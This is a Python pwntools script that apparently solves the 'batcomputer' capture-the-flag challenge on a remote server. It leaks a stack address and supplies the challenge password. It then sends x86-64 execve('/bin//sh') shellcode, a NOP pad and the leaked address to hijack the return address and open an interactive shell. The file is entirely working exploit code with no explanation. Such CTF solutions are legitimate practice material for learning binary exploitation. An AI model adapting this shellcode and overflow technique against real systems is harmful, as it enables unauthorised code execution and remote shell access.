#!/usr/bin/env python3


from pwn import *

BINARY = "./batcomputer"
ADDR = "138.68.141.182"
PORT = 30590

splash()
elf = context.binary = ELF(BINARY)

SHELLCODE = """
	xor rsi, rsi
	push rax
	movabs rdi, 0x68732f2f6e69622f
	push rdi
	mov rdi, rsp
	mov al, 59
	syscall
"""


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter("> ", "1")
    io.recvuntil("It was very hard, but Alfred managed to locate him: ")
    stack_leak = int(io.recvuntil("\n")[:-1], 16)

    log.success(f"stack found @: {hex(stack_leak)}")

    io.sendlineafter("> ", "2")
    io.sendlineafter("Ok. Let's do this. Enter the password: ", "b4tp@$$w0rd!")

    payload = [
        asm(SHELLCODE),
        b"\x90" * 62,
        stack_leak,
    ]

    io.sendlineafter("Enter the navigation commands: ", flat(payload))
    io.sendlineafter("> ", "3")
    io.interactive()


if __name__ == "__main__":
    solve()
